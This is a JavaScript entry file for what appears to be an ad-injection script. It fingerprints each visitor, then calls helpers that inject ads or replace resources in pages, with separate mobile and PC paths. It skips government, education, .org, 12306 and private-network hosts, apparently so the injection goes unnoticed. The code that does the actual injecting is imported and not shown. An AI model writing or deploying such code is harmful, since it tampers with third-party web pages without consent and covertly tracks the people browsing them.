import { phone } from 'ismobilejs';
import { inject, anylaseResource } from './utils';
import toutiao from './toutiao';
import { inPC, inMobile } from './inPlatform';
import { name, version } from '../package.json';
import { JS_ID } from './config';

const blackWebsite = /\.edu|\.org|12306\.com|\.gov|^192\.168/;
const { host } = window.location;

function extend() {
  if (window.adExtendsJS || window.top !== window || blackWebsite.test(host)) return;
  window.adExtendsJS = `${name}-${version}`;
  if (window.Fingerprint2) {
    new Fingerprint2().get((result) => {
      const uuid = result;
      inject(uuid);
      if (phone) {
        inMobile(uuid);
        if (window.veryciinjectjshelper && window.veryciinjectjshelper.search('jweixin') !== -1) return;
        toutiao(uuid);
      } else inPC(uuid);
    });
  } else {
    inject('-');
    if (phone) {
      inMobile('-');
      if (window.veryciinjectjshelper && window.veryciinjectjshelper.search('jweixin') !== -1) return;
      toutiao('-');
    } else inPC('-');
  }
}

function replace() {
  if (window.adReplaceJS || window.top !== window || blackWebsite.test(host)) return;
  window.adReplaceJS = `${name}-${version}`;
  if (window.Fingerprint2) {
    new Fingerprint2().get((result) => {
      const uuid = result;
      anylaseResource(uuid);
      inject(uuid);
    });
  } else {
    anylaseResource('-');
    inject('-');
  }
}

switch (JS_ID) {
  case '1': replace();
    break;
  case '2': extend();
    break;
  default: replace(); extend();
}
